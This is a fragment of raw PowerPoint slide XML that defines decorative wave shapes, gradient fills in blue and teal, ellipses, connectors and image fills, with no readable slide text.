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8" r:id="rId3"/>
    <p:sldId id="256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7" r:id="rId19"/>
    <p:sldId id="273" r:id="rId20"/>
    <p:sldId id="274" r:id="rId21"/>
    <p:sldId id="275" r:id="rId22"/>
    <p:sldId id="272" r:id="rId23"/>
    <p:sldId id="276" r:id="rId24"/>
    <p:sldId id="277" r:id="rId25"/>
    <p:sldId id="288" r:id="rId27"/>
    <p:sldId id="289" r:id="rId28"/>
    <p:sldId id="285" r:id="rId29"/>
    <p:sldId id="284" r:id="rId30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107" d="100"/>
          <a:sy n="107" d="100"/>
        </p:scale>
        <p:origin x="52" y="1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115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FEA88-0C02-49B1-A0B2-1B2D9667CB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518D0-3A73-44FE-AD37-BC79348219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518D0-3A73-44FE-AD37-BC79348219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518D0-3A73-44FE-AD37-BC79348219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/>
              <a:stretch>
                <a:fillRect l="-185" r="-185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20999">
                  <a:srgbClr val="063C66">
                    <a:alpha val="96862"/>
                  </a:srgbClr>
                </a:gs>
                <a:gs pos="40000">
                  <a:srgbClr val="063C66">
                    <a:alpha val="76862"/>
                  </a:srgbClr>
                </a:gs>
                <a:gs pos="61000">
                  <a:srgbClr val="063C66">
                    <a:alpha val="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0" y="4724400"/>
              <a:ext cx="12192000" cy="2133600"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="12192000" h="2133600">
                  <a:moveTo>
                    <a:pt x="12192000" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12192000" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11084058" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10045340" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9073611" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8166640" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7322192" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6538036" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5811938" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5141665" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4524984" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3959662" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3443466" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2974163" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2549520" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2167304" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1521222" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1018052" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="639930" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="368992" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="187375" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="77213" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20644" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="321"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="163848" y="16869"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="502836" y="51104"/>
                    <a:pt x="502836" y="51104"/>
                    <a:pt x="502836" y="51104"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="1027941" y="102209"/>
                    <a:pt x="1537134" y="249133"/>
                    <a:pt x="2008138" y="482296"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="3551630" y="1255247"/>
                    <a:pt x="3551630" y="1255247"/>
                    <a:pt x="3551630" y="1255247"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="5060114" y="2005840"/>
                    <a:pt x="6851838" y="1922795"/>
                    <a:pt x="8283943" y="1028472"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="8764494" y="728235"/>
                    <a:pt x="9295964" y="523818"/>
                    <a:pt x="9852894" y="421610"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="12192000" y="0"/>
                    <a:pt x="12192000" y="0"/>
                    <a:pt x="12192000" y="0"/>
                  </a:cubicBezTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:gradFill>
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="3E9EED">
                    <a:alpha val="0"/>
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:srgbClr>
                </a:gs>
                <a:gs pos="100000">
                  <a:srgbClr val="3E9EED">
                    <a:alpha val="100000"/>
                  </a:srgbClr>
                </a:gs>
              </a:gsLst>
              <a:lin ang="81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0" y="4724400"/>
              <a:ext cx="12192000" cy="2133600"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="12192000" h="2133600">
                  <a:moveTo>
                    <a:pt x="11509360" y="0"/>
                  </a:moveTo>
                  <a:cubicBezTo>
                    <a:pt x="12022532" y="0"/>
                    <a:pt x="12150824" y="0"/>
                    <a:pt x="12182896" y="0"/>
                  </a:cubicBezTo>
                  <a:lnTo>
                    <a:pt x="12192000" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12192000" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="910"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="185769" y="107397"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="2060646" y="1182123"/>
                    <a:pt x="2060646" y="1182123"/>
                    <a:pt x="2060646" y="1182123"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="3998762" y="2290763"/>
                    <a:pt x="6391968" y="2214085"/>
                    <a:pt x="8253706" y="980843"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="9217992" y="341857"/>
                    <a:pt x="10350944" y="0"/>
                    <a:pt x="11509360" y="0"/>
                  </a:cubicBezTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:gradFill>
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="43D0B1">
                    <a:alpha val="0"/>
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:srgbClr>
                </a:gs>
                <a:gs pos="100000">
                  <a:srgbClr val="43D0B1">
                    <a:alpha val="100000"/>
                  </a:srgbClr>
                </a:gs>
              </a:gsLst>
              <a:lin ang="8100000"/>
            </a:gradFill>
            <a:ln>
              <a:prstDash val="solid"/>
              <a:headEnd type="none"/>
              <a:tailEnd type="none"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868478" y="740229"/>
            <a:ext cx="512081" cy="127771"/>
            <a:chOff x="10653486" y="740229"/>
            <a:chExt cx="698045" cy="174171"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="8" name="AutoShape 8"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="10653486" y="740229"/>
              <a:ext cx="174171" cy="174171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0915423" y="740229"/>
              <a:ext cx="174171" cy="174171"/>
            </a:xfrm>
            <a:prstGeom prst="ellipse">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="43D0B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11177360" y="740229"/>
              <a:ext cx="174171" cy="174171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43D0B1">
                <a:alpha val="100000"/>
                <a:lumMod val="50000"/>
              </a:srgbClr>
            </a:gs>
            <a:gs pos="72000">
              <a:srgbClr val="063C6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54802"/>
            <a:ext cx="12192000" cy="5729170"/>
            <a:chOff x="0" y="654802"/>
            <a:chExt cx="12192000" cy="5729170"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="3" name="AutoShape 3"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="673100" y="654802"/>
              <a:ext cx="11518900" cy="475496"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="12192000" h="503281">
                  <a:moveTo>
                    <a:pt x="0" y="401840"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9530483" y="401840"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9487737" y="503281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="503281"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9952037" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12192000" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12192000" y="503281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9739958" y="503281"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:gradFill>
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="3E9EED">
                    <a:alpha val="0"/>
                  </a:srgbClr>
                </a:gs>
                <a:gs pos="94999">
                  <a:srgbClr val="43D0B1">
                    <a:alpha val="10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6261417"/>
              <a:ext cx="12192000" cy="122555"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="12192000" h="122555">
                  <a:moveTo>
                    <a:pt x="8945941" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12192000" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12192000" y="122555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8893007" y="122555"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8715653" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8662718" y="122555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="122555"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:gradFill>
              <a:gsLst>
                <a:gs pos="20000">
                  <a:srgbClr val="3E9EED">
                    <a:alpha val="0"/>
                  </a:srgbClr>
                </a:gs>
                <a:gs pos="43999">
                  <a:srgbClr val="3E9EED">
                    <a:alpha val="76862"/>
                  </a:srgbClr>
                </a:gs>
                <a:gs pos="100000">
                  <a:srgbClr val="3E9EED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F2F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blipFill rotWithShape="1">
                <a:blip r:embed="rId2"/>
                <a:stretch>
                  <a:fillRect l="-185" r="-185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063C66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0" y="4724400"/>
              <a:ext cx="12192000" cy="2133600"/>
              <a:chOff x="0" y="4724400"/>
              <a:chExt cx="12192000" cy="2133600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0" y="4724400"/>
                <a:ext cx="121920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2133600">
                    <a:moveTo>
                      <a:pt x="12192000" y="0"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="12192000" y="2133600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="11084058" y="2133600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="10045340" y="2133600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="9073611" y="2133600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="8166640" y="2133600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="7322192" y="2133600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="6538036" y="2133600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="5811938" y="2133600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="5141665" y="2133600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4524984" y="2133600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3959662" y="2133600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3443466" y="2133600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="2974163" y="2133600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="2549520" y="2133600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="2167304" y="2133600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1521222" y="2133600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1018052" y="2133600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="639930" y="2133600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="368992" y="2133600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="187375" y="2133600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="77213" y="2133600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20644" y="2133600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="2133600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="321"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="163848" y="16869"/>
                    </a:lnTo>
                    <a:cubicBezTo>
                      <a:pt x="502836" y="51104"/>
                      <a:pt x="502836" y="51104"/>
                      <a:pt x="502836" y="51104"/>
                    </a:cubicBezTo>
                    <a:cubicBezTo>
                      <a:pt x="1027941" y="102209"/>
                      <a:pt x="1537134" y="249133"/>
                      <a:pt x="2008138" y="482296"/>
                    </a:cubicBezTo>
                    <a:cubicBezTo>
                      <a:pt x="3551630" y="1255247"/>
                      <a:pt x="3551630" y="1255247"/>
                      <a:pt x="3551630" y="1255247"/>
                    </a:cubicBezTo>
                    <a:cubicBezTo>
                      <a:pt x="5060114" y="2005840"/>
                      <a:pt x="6851838" y="1922795"/>
                      <a:pt x="8283943" y="1028472"/>
                    </a:cubicBezTo>
                    <a:cubicBezTo>
                      <a:pt x="8764494" y="728235"/>
                      <a:pt x="9295964" y="523818"/>
                      <a:pt x="9852894" y="421610"/>
                    </a:cubicBezTo>
                    <a:cubicBezTo>
                      <a:pt x="12192000" y="0"/>
                      <a:pt x="12192000" y="0"/>
                      <a:pt x="121920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E9EED">
                      <a:alpha val="0"/>
                      <a:lumMod val="60000"/>
                      <a:lumOff val="4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81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0" y="4724400"/>
                <a:ext cx="12192000" cy="2133600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2133600">
                    <a:moveTo>
                      <a:pt x="11509360" y="0"/>
                    </a:moveTo>
                    <a:cubicBezTo>
                      <a:pt x="12022532" y="0"/>
                      <a:pt x="12150824" y="0"/>
                      <a:pt x="12182896" y="0"/>
                    </a:cubicBezTo>
                    <a:lnTo>
                      <a:pt x="12192000" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="12192000" y="2133600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="2133600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="910"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="185769" y="107397"/>
                    </a:lnTo>
                    <a:cubicBezTo>
                      <a:pt x="2060646" y="1182123"/>
                      <a:pt x="2060646" y="1182123"/>
                      <a:pt x="2060646" y="1182123"/>
                    </a:cubicBezTo>
                    <a:cubicBezTo>
                      <a:pt x="3998762" y="2290763"/>
                      <a:pt x="6391968" y="2214085"/>
                      <a:pt x="8253706" y="980843"/>
                    </a:cubicBezTo>
                    <a:cubicBezTo>
                      <a:pt x="9217992" y="341857"/>
                      <a:pt x="10350944" y="0"/>
                      <a:pt x="115093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0"/>
                      <a:lumMod val="60000"/>
                      <a:lumOff val="40000"/>
                    </a:srgbClr>
                  </a:gs>
                  <a:gs pos="100000">
                    <a:srgbClr val="43D0B1">
                      <a:alpha val="100000"/>
                    </a:srgbClr>
                  </a:gs>
                </a:gsLst>
                <a:lin ang="8100000"/>
              </a:gra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43D0B1">
                <a:alpha val="100000"/>
                <a:lumMod val="50000"/>
              </a:srgbClr>
            </a:gs>
            <a:gs pos="72000">
              <a:srgbClr val="063C6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54802"/>
            <a:ext cx="12192000" cy="5729170"/>
            <a:chOff x="0" y="654802"/>
            <a:chExt cx="12192000" cy="5729170"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="3" name="AutoShape 3"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="673100" y="654802"/>
              <a:ext cx="11518900" cy="475496"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="12192000" h="503281">
                  <a:moveTo>
                    <a:pt x="0" y="401840"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9530483" y="401840"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9487737" y="503281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="503281"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9952037" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12192000" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12192000" y="503281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9739958" y="503281"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:gradFill>
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="3E9EED">
                    <a:alpha val="0"/>
                  </a:srgbClr>
                </a:gs>
                <a:gs pos="94999">
                  <a:srgbClr val="43D0B1">
                    <a:alpha val="10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6261417"/>
              <a:ext cx="12192000" cy="122555"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="12192000" h="122555">
                  <a:moveTo>
                    <a:pt x="8945941" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12192000" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12192000" y="122555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8893007" y="122555"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8715653" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8662718" y="122555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="122555"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:gradFill>
              <a:gsLst>
                <a:gs pos="20000">
                  <a:srgbClr val="3E9EED">
                    <a:alpha val="0"/>
                  </a:srgbClr>
                </a:gs>
                <a:gs pos="43999">
                  <a:srgbClr val="3E9EED">
                    <a:alpha val="76862"/>
                  </a:srgbClr>
                </a:gs>
                <a:gs pos="100000">
                  <a:srgbClr val="3E9EED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43D0B1">
                <a:alpha val="100000"/>
                <a:lumMod val="50000"/>
              </a:srgbClr>
            </a:gs>
            <a:gs pos="72000">
              <a:srgbClr val="063C6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261417"/>
            <a:ext cx="12192000" cy="122555"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="12192000" h="122555">
                <a:moveTo>
                  <a:pt x="8945941" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="12192000" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12192000" y="122555"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8893007" y="122555"/>
                </a:lnTo>
                <a:close/>
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="8715653" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8662718" y="122555"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="122555"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:gradFill>
            <a:gsLst>
              <a:gs pos="20000">
                <a:srgbClr val="3E9EED">
                  <a:alpha val="20000"/>
                </a:srgbClr>
              </a:gs>
              <a:gs pos="43999">
                <a:srgbClr val="3E9EED">
                  <a:alpha val="76862"/>
                </a:srgbClr>
              </a:gs>
              <a:gs pos="100000">
                <a:srgbClr val="3E9EED">
                  <a:alpha val="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43D0B1">
                <a:alpha val="100000"/>
                <a:lumMod val="50000"/>
              </a:srgbClr>
            </a:gs>
            <a:gs pos="72000">
              <a:srgbClr val="063C6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2590800"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="12192000" cy="2366996"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="3" name="AutoShape 3"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="1354110"/>
              <a:ext cx="12192000" cy="1012886"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="12192000" h="1012886">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12192000" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12192000" y="623295"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11817509" y="678453"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="10312035" y="886099"/>
                    <a:pt x="8302762" y="1012886"/>
                    <a:pt x="6096000" y="1012886"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="3889238" y="1012886"/>
                    <a:pt x="1879965" y="886099"/>
                    <a:pt x="374491" y="678453"/>
                  </a:cubicBezTo>
                  <a:lnTo>
                    <a:pt x="0" y="623295"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="43D0B1">
                <a:alpha val="45098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2366996"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="12192000" h="2366996">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12192000" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12192000" y="1700829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11817509" y="1795145"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="10312035" y="2150202"/>
                    <a:pt x="8302762" y="2366996"/>
                    <a:pt x="6096000" y="2366996"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="3889238" y="2366996"/>
                    <a:pt x="1879965" y="2150202"/>
                    <a:pt x="374491" y="1795145"/>
                  </a:cubicBezTo>
                  <a:lnTo>
                    <a:pt x="0" y="1700829"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:blipFill rotWithShape="1">
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect t="-94330" b="-94330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0" y="0"/>
              <a:ext cx="12192000" cy="2366996"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="12192000" h="2366996">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12192000" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12192000" y="1700829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11817509" y="1795145"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="10312035" y="2150202"/>
                    <a:pt x="8302762" y="2366996"/>
                    <a:pt x="6096000" y="2366996"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="3889238" y="2366996"/>
                    <a:pt x="1879965" y="2150202"/>
                    <a:pt x="374491" y="1795145"/>
                  </a:cubicBezTo>
                  <a:lnTo>
                    <a:pt x="0" y="1700829"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="43D0B1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cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="6" name="Connector 6"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="5259319" y="3038473"/>
            <a:ext cx="0" cy="2852646"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="3175">
            <a:solidFill>
              <a:srgbClr val="2F2F2F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43D0B1">
            <a:alpha val="100000"/>
            <a:lumMod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/>
              <a:stretch>
                <a:fillRect l="-185" r="-185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20999">
                  <a:srgbClr val="063C66">
                    <a:alpha val="96862"/>
                  </a:srgbClr>
                </a:gs>
                <a:gs pos="40000">
                  <a:srgbClr val="063C66">
                    <a:alpha val="76862"/>
                  </a:srgbClr>
                </a:gs>
                <a:gs pos="61000">
                  <a:srgbClr val="063C66">
                    <a:alpha val="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0" y="4724400"/>
              <a:ext cx="12192000" cy="2133600"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="12192000" h="2133600">
                  <a:moveTo>
                    <a:pt x="12192000" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12192000" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11084058" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10045340" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9073611" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8166640" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7322192" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6538036" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5811938" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5141665" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4524984" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3959662" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3443466" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2974163" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2549520" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2167304" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1521222" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1018052" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="639930" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="368992" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="187375" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="77213" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20644" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="321"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="163848" y="16869"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="502836" y="51104"/>
                    <a:pt x="502836" y="51104"/>
                    <a:pt x="502836" y="51104"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="1027941" y="102209"/>
                    <a:pt x="1537134" y="249133"/>
                    <a:pt x="2008138" y="482296"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="3551630" y="1255247"/>
                    <a:pt x="3551630" y="1255247"/>
